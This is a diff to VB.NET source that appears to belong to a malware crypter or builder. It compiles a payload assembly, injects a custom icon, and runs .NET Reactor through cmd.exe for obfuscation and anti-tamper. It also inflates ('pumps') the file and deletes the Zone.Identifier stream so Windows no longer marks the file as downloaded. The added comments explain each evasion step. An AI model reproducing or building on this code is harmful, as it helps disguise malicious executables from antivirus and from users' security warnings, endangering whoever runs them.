@@ -29,18 +29,20 @@ Public Class Codedom
 
             .EmbeddedResources.Add(IO.Path.GetTempPath & "\" + Main.ResName + ".Resources")
 
+            'Check for errors
             Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
             If Results.Errors.Count > 0 Then
                 For Each E In Results.Errors
                     Main.txtLog.AppendText(E.ErrorText)
                 Next
             Else
-
+                'Add Icon
                 If Main.chkIcon.Checked = True AndAlso Main.picIcon.ImageLocation <> "" Then
                     Main.txtLog.AppendText("Changing Icon..." + Environment.NewLine)
                     IconInjector.InjectIcon(Path, Main.picIcon.ImageLocation)
                 End If
 
+                'Using .NET reactor for more obfuscation, you can remove the whole method if you want
                 IO.File.WriteAllBytes(IO.Path.GetTempPath + "\dotNET_Reactor.exe", My.Resources.dotNET_Reactor1)
                 Dim Info As ProcessStartInfo = New ProcessStartInfo()
                 Info.Arguments = "/C dotNET_Reactor.exe -file """ & Path & """ -antitamp 1  -obfuscation 1 -antitamp  1 -targetfile """ & Path & """"
@@ -50,6 +52,7 @@ Public Class Codedom
                 Info.FileName = "cmd.exe"
                 Process.Start(Info)
 
+                'needed since we are using cmd, giving time for pump
                 Threading.Thread.Sleep(2500)
 
                 If Main.chkPump.Checked = True Then
@@ -57,6 +60,7 @@ Public Class Codedom
                     Helper.Pumper(Path)
                 End If
 
+                'remove zone
                 If Main.chkZoneIden.Checked = True Then
                     Main.txtLog.AppendText("Deleting Zone-Identifier..." + Environment.NewLine)
                     Helper.DeleteZoneIdentifier(Path)
